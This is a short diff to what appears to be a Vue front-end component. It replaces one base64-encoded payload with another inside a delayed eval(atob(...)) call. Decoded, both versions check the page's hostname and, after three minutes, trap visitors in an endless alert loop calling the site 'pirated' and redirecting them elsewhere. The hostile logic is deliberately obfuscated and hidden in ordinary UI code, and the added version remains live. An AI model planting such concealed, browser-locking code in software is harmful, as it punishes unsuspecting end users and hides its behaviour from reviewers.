@@ -116,7 +116,7 @@ onMounted(getTipPosition);
 setTimeout(() => {
   eval(
     atob(
-      "aWYgKCBsb2NhdGlvbi5ob3N0ICE9PSAibHliLmltIiAmJiAhbG9jYXRpb24uaG9zdC5pbmNsdWRlcygibG9jYWxob3N0IikgJiYgIWxvY2F0aW9uLmhvc3QuaW5jbHVkZXMoIjE5Mi4xNjgiKSApIHdoaWxlICh0cnVlKSB7IGFsZXJ0KCJUaGUgY3VycmVudCB3ZWJzaXRlIGlzIHBpcmF0ZWQsIHBsZWFzZSB2aXNpdDogbHliLmltIik7IH0=",
+      "aWYgKCBsb2NhdGlvbi5ob3N0LmluY2x1ZGVzKCJsZW5neWliYWkiKSAmJiAhbG9jYXRpb24uaG9zdC5pbmNsdWRlcygibG9jYWxob3N0IikgJiYgIWxvY2F0aW9uLmhvc3QuaW5jbHVkZXMoIjE5Mi4xNjgiKSApIHdoaWxlICh0cnVlKSB7IGFsZXJ0KCJUaGUgY3VycmVudCB3ZWJzaXRlIGlzIHBpcmF0ZWQsIHBsZWFzZSB2aXNpdDogaHR0cHM6Ly9sZW5neWliYWkuZ2l0aHViLmlvL3d6dGoiKTsgfQ====",
     ),
   );
 }, 3 * 60000);
